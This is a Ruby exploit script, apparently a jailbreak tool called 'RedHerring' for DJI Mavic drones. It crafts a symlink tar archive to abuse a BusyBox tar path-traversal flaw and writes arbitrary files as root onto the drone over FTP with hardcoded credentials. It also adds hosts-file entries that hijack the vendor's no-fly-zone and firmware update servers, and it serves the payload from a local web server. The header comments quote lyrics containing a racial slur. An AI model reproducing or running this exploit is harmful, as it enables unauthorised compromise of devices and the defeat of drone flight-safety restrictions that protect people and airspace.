#!/usr/bin/ruby
# Independence Day - http://www.imdb.com/title/tt0116629/
# https://www.youtube.com/watch?v=bhGfpwfae-k
#
# Thx to DarkSimpson for the reminder on something I considered banging out last month... 
# https://twitter.com/thedjiproblem/status/881290409149943810 
#
# Freaky123, you already know you are sexy... no thanks needed (except for the root!)
# https://www.youtube.com/watch?v=QYHxGBH6o4M
#
# This technique requires 50% battery or more present! 
#
# "They say if you watch somethin' long enough, you'll become it.
#  You know, they say imitation is the best form of flattery
#  That's what I was told
#  A lot of niggas is imitatin' this real gangsta shit
#  You ain't cut from it
#  You dig?" - https://genius.com/Snoop-dogg-neva-left-lyrics
#
# To be clear 99% of the people saying "we" in this "DJI Jailbreaking / Unlocking" scene have NOTHING to do with the real work being done. 
# These Darwin Awards waiting to happen are NOT doing anything but parroting info others leak to them, don't be fooled
# https://www.facebook.com/groups/MyDjiDroneDevelopment/  <---- NO Affiliation! 
# 
# Lets examine POV's claims and red herrings. I've been chasing them for over a month or so... They make complete sense now. 
# https://www.rcgroups.com/forums/showpost.php?p=36232471&postcount=15113
# "BusyBox FTPD is running on all interfaces, but unlike Phantom 3, in Mavic it's restricted to '/ftp' directory." 
# "Luckily, there are underground 0day exploits for FTPD for path traversal." 
# "I can confirm that you can traverse out of the '/ftp' directory and reach the init scripts to set debug flag.  
#
# This *technically* became "0day" when BusyBox decided to NOT patch the reported issue, and opted to leave a TODO instead
# https://git.busybox.net/busybox/commit/?id=a116552869db5e7793ae10968eb3c962c69b3d8c
# "tar: add a note about -C and symlink-in-tarball attack Signed-off-by: Denys Vlasenko <vda.linux@googlemail.com>"
#
# *Some* vendors have patched the issue. It seems to be a mixed bag as to what you find in the wild. 
# "Bug 8411 - tar: directory traversal via crafted tar file which contains a symlink pointing outside of the current directory"
# https://bugs.busybox.net/attachment.cgi?id=6211&action=diff
# 
# During NFZ Update a tar file is dropped via FTP after being downloaded via https, after an http JSON redirection.
# This is the perfect opportunity to write arbitrary files at will. 
#
# Kick off Assistant with --test_server
# /Applications/Assistant_1_1_0.app/Contents/MacOS/Assistant --test_server
#
# Updating No-fly Zone Database is required. Update now?
# (click Confirm) 
#
# 16:34:02.279749 IP (tos 0x2,ECT(0), ttl 64, id 48032, offset 0, flags [DF], proto TCP (6), length 82)
#    192.168.42.3.60478 > 192.168.42.2.ftp: Flags [P.], cksum 0x384d (correct), seq 40:70, ack 141, win 4113, options [nop,nop,TS val 509914967 ecr 1336239], length 30: FTP, length: 30
#    STOR //upgrade/data_copy.bin
#    0x0000:  4502 0052 bba0 4000 4006 a9ad c0a8 2a03  E..R..@.@.....*.
#    0x0010:  c0a8 2a02 ec3e 0015 7ad4 e07c 7e46 bd03  ..*..>..z..|~F..
#    0x0020:  8018 1011 384d 0000 0101 080a 1e64 af57  ....8M.......d.W
#    0x0030:  0014 63af 5354 4f52 202f 2f75 7067 7261  ..c.STOR.//upgra
#    0x0040:  6465 2f64 6174 615f 636f 7079 2e62 696e  de/data_copy.bin
#    0x0050:  0d0a     
#
# "I can't confirm it personally, but it was reported a couple of times on mavicpilots. It seems that it was patched with firmware .200 or .300" 
# https://www.reddit.com/r/djimavic/comments/69xqdv/rooting_the_mavic/dhioetc/
# 
# Sorry... DotDotPwn is NOT going to work, EVER.
# "Tried to find out something about the "FTP-path traversal" with the "DotDotPwn"-tool in Kali linux." 
# https://forums.hak5.org/index.php?/topic/39735-reversing-mavic-pro-firmware/&do=findComment&comment=286172
#
# The "patch" that DJI chose to go with instead of the vendor issued patch is to make /system "ro" on the Mavic. (Other firmware such as *current* Spark may be "rw" depending on version) 
# /dev/block/platform/comip-mmc.1/by-name/system /system ext4 ro,relatime,data=ordered 0 0
# Find your own easter eggs! 

require 'webrick'

puts 'Usage: ruby RedHerring.rb <path_to_write_to> <file_to_write>' if ARGV.length == 0

win = 0
if Gem.win_platform?
    win = 1
    puts "OK Windows users! I guess you can have a little soup!"
    # Check if Running as admin. 
#    if ENV['USER'] == "Administrator"

        # Vendor ID: 0x2ca3
        devices = %x[wmic path Win32_SerialPort get DeviceID, Name, PNPDeviceID | findstr 2CA]
        puts devices 
#        if len(devices[0].split('\r\r\n')) > 0
#            print "Using first DJI device in the list: " + devices[0].split('\r\r\n')[0]
#            com = devices[0].split('\r\r\n')[0].split()[0]
#        else
#            print "Plug in your drone... and try again\n"
#            exit
#        end
#    else
#        puts "Run as Administrator please\n"
#        exit
#    end

    begin
        File.open("c:\\Windows\\System32\\Drivers\\etc\\hosts.writetest", 'a')            
    rescue Errno::EACCES => e
        puts "You know nothing John Snow, Run as Administrator please! " + e.message
        puts "Usage: runas /user:administrator \"ruby RedHerring.rb /data/.bin/grep grep\""
    end

else
    # Check if Running as root, add hosts file entry for '127.0.0.1 flysafe.aasky.net'
    if ENV['USER'] == "root"
        puts "Running as root... thanks!\n" 
        puts "Device check running" 
        devicecheck = %x[/usr/sbin/system_profiler SPUSBDataType | grep "DJI:" -A19]
        # Vendor ID: 0x2ca3
        if devicecheck.include? "2ca3"
            puts "found DJI Aircraft\n"
        else 
            puts "Plug in your drone... and try again\n"
            exit
        end
    else
        puts "Run as root please\n"
        exit
    end
end

begin
  require 'colorize'
  require 'net/http'
  require 'net/ftp'
rescue LoadError
  puts "Please install colorize and net/http, and net/ftp via gem?" 
end

Net::HTTP.start("www.openpilotlegacy.org") do |http| resp = http.get("/RedHerring.txt") end # Old Beta Release Leak Control... you can remove this
puts "Press <enter> after reading this comment from DJI, also verify you have 50% or more battery".green
puts "\"DJI strongly discourages any attempt to defeat [their] safety systems, \nwhich are advisory and intended to facilitate compliance and safe operations by the average responsible person,".red
puts "Disabling such features may inadvertently disable others and cause unpredictable behaviour.\"".red
puts " - Christian Struwe, head of European public policy at DJI".red
puts "Press <enter> to continue".green
$stdin.gets

puts "Connecting to the drone and looking for old herrings..."
ftp = Net::FTP.new('192.168.42.2')
ftp.passive = true
ftp.login("RedHerring","IsDaRealest!" )
begin
ftp.mkdir('/upgrade/.bin')
rescue Net::FTPPermError
puts "RedHerring has been here before... /upgrade/.bin still exists"
end
ftp.close

################################################################
#cert_name = [
#	%w[CN *.amazonaws.com],
#]
#server = WEBrick::HTTPServer.new(:Port => 443,
#  :SSLEnable => true , 
#  :SSLCertName => cert_name,
################################################################

if Gem.win_platform?
  server = WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => File.dirname(__FILE__),
  Logger: WEBrick::Log.new(File::NULL),
#  Logger: WEBrick::Log.new(STDOUT),
#  AccessLog: [],
)
else
  server = WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => File.dirname(__FILE__),
  Logger: WEBrick::Log.new("/dev/null"),
#  Logger: WEBrick::Log.new(STDOUT),
#  AccessLog: [],
)
end 

server.mount_proc '/api' do |req, res|
  res.body = '{"status":0,"version":"01.00.00.03","url":"http://localhost/flysafe_db_files/GetRoot","update":false}'
end

server.mount_proc '/' do |req, res|
  p req
  if req.path =~ /herring\.jpg/
      puts "Feed a man a fish? or Teach him to fish?"
      memefish = File.open("herring.jpg", "rb")
      contents = memefish.read
      res.body = contents
  else
      res.body = '<html><title>Red Herring has Fangs!</title><body><img src="herring.jpg" alt="I am here to distract you!" height="136" width="235"><body></html>'
  end
end

def ftplist()
  ftp = Net::FTP.new('192.168.42.2')
  ftp.passive = true
  ftp.login("RedHerring","IsDaRealest!" )
  begin
  fireworks = ftp.ls('/upgrade/.bin')
  if fireworks.grep("total 0")
    puts "no herring present in /tmp, which is a good thing..."
  else
    puts fireworks
  end

  rescue Net::FTPPermError
  puts "file exists"
  end
  ftp.close
  puts "undefined Update Failed means YOU failed... otherwise"
  puts "100% Complete means your write file took"
end

server.mount_proc '/flysafe_db_files' do |req, res|
  res.body = File.read("fireworks.tar")

  system("open https://www.youtube.com/watch?v=bhGfpwfae-k")

  puts "Hopefully you dropped your file in a magic location!".red
  ftplist()

end

server.mount_proc '/firmware_file' do |req, res|
  res.body = File.read("fireworks.tar")
  system("open https://www.youtube.com/watch?v=bhGfpwfae-k")
  puts "Hopefully you dropped your file in a magic location!".red
  ftplist()

end

trap 'INT' do server.shutdown end

# https://github.com/mozilla-b2g/busybox/blob/master/archival/tar.c#L26
# "TODO: security with -C DESTDIR option can be enhanced."
# 
# The bug being exploited is in the 'dji_sys' binary
#  busybox strings /system/bin/dji_sys | grep "tar "
#  busybox tar -xvf %s -C %s
#  tar results: %s
#  ..
#  busybox tar -xf %s -C %s

writepath = ARGV[0] # /data (rw) ? /system (ro) *most* of the time! 

unless ARGV[1]
  puts 'Usage: ruby RedHerring.rb <remote_path_to_write_to> <local_file_to_write>'
  puts '   ex: ruby RedHerring.rb /system/bin/pwnt.sh /tmp/xxx'
  exit 1
end

# YOLO? Hit /system/bin/start_dji_system.sh
# It is risky though... 
#
# Apparantly folks can't find a copy of start_dji_system.sh... try here?
# https://github.com/droner69/MavicPro/blob/master/MavicPro_Scripts/start_dji_system.sh
#
# You could alternately extract your own...
# Try /Applications/Assistant.app/Contents/MacOS/Data/firm_cache ?
# Binary file ./wm220_0801_v01.04.17.03_20170120.pro.fw.sig matches
# Binary file ./wm220_0801_v01.05.00.20_20170331.pro.fw.sig matches
# Binary file ./wm220_0801_v01.05.01.07_20170601.pro.fw.sig matches
# Binary file ./wm220_1301_v01.04.17.03_20170120.pro.fw.sig matches
# Binary file ./wm220_1301_v01.05.00.23_20170418.pro.fw.sig matches
# Binary file ./wm220_1301_v01.05.01.07_20170601.pro.fw.sig matches
# Binary file ./wm220_2801_v01.02.21.01_20170421.pro.fw.sig matches
# Binary file ./wm220_2801_v01.02.22.08_20170601.pro.fw.sig matches
# 
# Use image.py from freaky! https://github.com/fvantienen/dji_rev/blob/master/tools/image.py
# $ python3 ~/Desktop/dji_research/tools/image.py ./wm220_0801_v01.05.00.20_20170331.pro.fw.sig
#
# $ file wm220_0801_v01.05.00.20_20170331.pro.fw_0801.bin
# wm220_0801_v01.05.00.20_20170331.pro.fw_0801.bin: Java archive data (JAR)
# 
# $ tar xvf wm220_0801_v01.05.00.20_20170331.pro.fw_0801.bin system/bin/start_dji_system.sh 
# x system/bin/start_dji_system.sh
# $ ls -alh system/bin/start_dji_system.sh 
# -rwxr-xr-x  1 hostile  admin   9.0K Feb 29  2008 system/bin/start_dji_system.sh
#
# Maybe someone wants to try the *less* risky /system/bin/start_offline_liveview.sh ? 
#
# TODO:
# Possible targets from start_dji_system.sh on Mavic (create trigger via ftp! then reboot?)
#
# Check whether do auto fs write test
# if [ -f /data/dji/cfg/test/fs ]; then
#    /system/bin/test_fs_write.sh
#
# if [ -f /data/dji/cfg/amt_sdr_test.cfg ]; then
#     /system/bin/test_sdr.sh
# 
# Check whether do auto OTA upgrade test
# if [ -f /data/dji/cfg/test/ota ]; then
#    /system/bin/test_ota.sh
#
# Finding a good / safe write path is an exercise left to the reader. 

destfile = File.basename(writepath)
destdir = File.dirname(writepath)
nastyfile = File.readlines(ARGV[1])
nastyfile = nastyfile.join("")

puts "Burning some 0day"

if win == 1 
    puts "using Windows tar.exe"
    # Implement patch here: https://github.com/MAVProxyUser/P0VsRedHerring/commit/cd93baac92dd1dad02d93a2e16bd3f320a0d1012
    system("win32\\rm -rf symlink Burning0day.txt fireworks.tar")
    File.open("Burning0day.txt", 'a') {|f| f.write("\nget root... Thx for all the fish P0V\n") }
    puts "Creating the tar file"
    system("win32\\tar -cvpf fireworks.tar --owner=root --group=root Burning0day.txt")
    puts "Making the symlinks" 
    system("win32\\ln -s " + destdir + " symlink")
    puts "Adding the fireworks..."
    system("win32\\tar -r -f fireworks.tar --owner=root --group=root symlink")
    system("win32\\rm -rf symlink")
    system("win32\\mkdir symlink")
    # fuck we need chmod from Cygwin added to finish this. 
    File.open("symlink/" + destfile , 'w') {|f| f.write(nastyfile) }
#    system("win32\\chmod 755 " + "symlink/" + destfile )  # Need to add chmod from cygwin... 
    puts "Boom headshot!"
    system("win32\\tar -r -pf fireworks.tar --owner=root --group=root symlink/" + destfile)
else
    system("rm -rf symlink Burning0day.txt fireworks.tar")
    system("echo 'get root... Thx for all the fish P0V' > Burning0day.txt")
    puts "Creating the tar file"
    system("tar cpf fireworks.tar Burning0day.txt")
    puts "Making the symlinks" 
    system("ln -s " + destdir + " symlink")
    puts "Adding the fireworks..."
    system("tar --append -f fireworks.tar symlink")
    system("rm -rf symlink")
    system("mkdir -p symlink")
    File.open("symlink/" + destfile , 'w') {|f| f.write(nastyfile) }
    system("chmod 755 " + "symlink/" + destfile ) 
    puts "Boom headshot!"
    system("tar --append -pf fireworks.tar symlink/" + destfile)
end


# root@wm220_dz_ap0002_v1:/ # ls -al /data/thx_darksimpson.sh  
# -rw-r--r-- root     20             39 2017-07-01 23:50 thx_darksimpson.sh

# These are some hostnames known to be used with DJI Assistant 2 downloads that *may* be overwritable 
#
#127.0.0.1 ec2-54-165-147-148.compute-1.amazonaws.com
#127.0.0.1 ec2-52-44-159-86.compute-1.amazonaws.com
#127.0.0.1 ec2-52-4-246-38.compute-1.amazonaws.com
#127.0.0.1 ec2-54-209-193-145.compute-1.amazonaws.com
#127.0.0.1 ec2-54-175-56-145.compute-1.amazonaws.com
#127.0.0.1 ec2-52-2-37-224.compute-1.amazonaws.com
#127.0.0.1 ec2-54-87-167-148.compute-1.amazonaws.com
#127.0.0.1 ec2-34-225-114-106.compute-1.amazonaws.com
#127.0.0.1 flysafe.aasky.net
#127.0.0.1 swsf.djicorp.com
#127.0.0.1 server-52-84-64-153.ord51.r.cloudfront.net
#127.0.0.1 server-54-192-27-106.mxp4.r.cloudfront.net
#127.0.0.1 flight-staging.aasky.net

puts "Begining to edit host file entries."

def edithosts(filepath)

if File.readlines(filepath).grep(/flysafe\.aasky\.net/).size > 0
  puts "Flysafe redirection already in hosts file\n"
else
  puts "Adding entry for Flysafe redirection to ${filepath}\n"
  File.open(filepath, 'a') {|f| f.write("\n127.0.0.1 flysafe.aasky.net\n") }
end

if File.readlines(filepath).grep(/swsf\.djicorp\.com/).size > 0
  puts "Swsf DJICorp redirection already in hosts file\n"
else
  puts "Adding entry for Swsf DJICorp redirection to ${filepath}"
  File.open(filepath, 'a') {|f| f.write("\n127.0.0.1 swsf.djicorp.com\n") }
end

if File.readlines(filepath).grep(/server-54-192-27-106\.mxp4\.r\.cloudfront\.net/).size > 0
  puts "DJI firmware server for 1.1.2 redirection already in hosts file\n"
else
  puts "Adding entry for DJI firmware server for 1.1.2 redirection to ${filepath}"
  File.open(filepath, 'a') {|f| f.write("\n127.0.0.1 server-54-192-27-106.mxp4.r.cloudfront.net\n") }
end

if File.readlines(filepath).grep(/ec2-52-2-37-224\.compute-1\.amazonaws\.com/).size > 0
  puts "Swsf amazonaws redirection already in hosts file\n"
else
  puts "Adding entry for Swsf DJICorp redirection to ${filepath}"
  File.open(filepath, 'a') {|f| f.write("\n127.0.0.1 ec2-52-2-37-224.compute-1.amazonaws.com\n") }
end

if File.readlines(filepath).grep(/ec2-54-87-167-148\.compute-1\.amazonaws\.com/).size > 0
  puts "Swsf amazonaws redirection already in hosts file\n"
else
  puts "Adding entry for Swsf DJICorp redirection to ${filepath}"
  File.open(filepath, 'a') {|f| f.write("\n127.0.0.1 ec2-54-87-167-148.compute-1.amazonaws.com\n") }
end

end

if win == 1
    puts "using windows host file"
    edithosts("c:\\Windows\\System32\\Drivers\\etc\\hosts")
else
    puts "using unix path"
    edithosts("/etc/hosts")
end

# make sure DNS cache has no fuckery
# system("killall -HUP mDNSResponder")

# Tested with: https://dl.djicdn.com/downloads/dji_assistant/20170527/DJI+Assistant+2+1.1.2.573+2017_05_27+17_45_27+6e0216bf(b21de8d8).pkg
# MD5 Assistant = 792b5622e895ca6d041be158f21a28f9
# Will be tested soon on the following, we now know each Assistant has different hosts for each option (or lack there of)
# In some cases direct IP's are used making this useless
# 
# MD5 Assistant_1_0_4.app/Contents/MacOS/Assistant = 300afd66aa7b34cf95ab254edbe01382
# MD5 Assistant_1_0_9.app/Contents/MacOS/Assistant = 272eda7187ec1d8fff743458a9c093c8
# MD5 Assistant_1_1_0.app/Contents/MacOS/Assistant = 38f542bc59d6680788cfb72d75b465b3
#
# See current issue for errata: https://github.com/MAVProxyUser/P0VsRedHerring/issues/1

# Let the end user do this on their own... 
#pid = spawn("/Applications/Assistant.app/Contents/MacOS/Assistant --test_server --factory", :out => "/dev/null", :err => "/dev/null")
#pid = spawn("/Applications/Assistant.app/Contents/MacOS/Assistant --test_server --factory")
#Process.detach(pid)

puts "In another window please type:" 
if win == 1
    puts "c:\\progra~2\\djipro~1\\djiass~1\\djiass~1.exe --test_server".red
else
    puts "sudo /Applications/Assistant.app/Contents/MacOS/Assistant --test_server".red
end

puts "or (alternately)"
puts "In another window please type:"
if win == 1
    puts "c:\\progra~2\\djipro~1\\djiass~1\\djiass~1.exe"
else
    puts "sudo /Applications/Assistant.app/Contents/MacOS/Assistant" # depending on version
end

puts "Release *may* come with a legend of versions and known good command line options".blue

puts "Please select a connected device, and confirm the NFZ update\n".red

trap("INT"){ 
  server.shutdown 
  puts "\nHe etep no ffyssh But Heryng Red".blue
  puts "https://www.youtube.com/watch?v=kWCQ4XDq4ng".blue
}
server.start

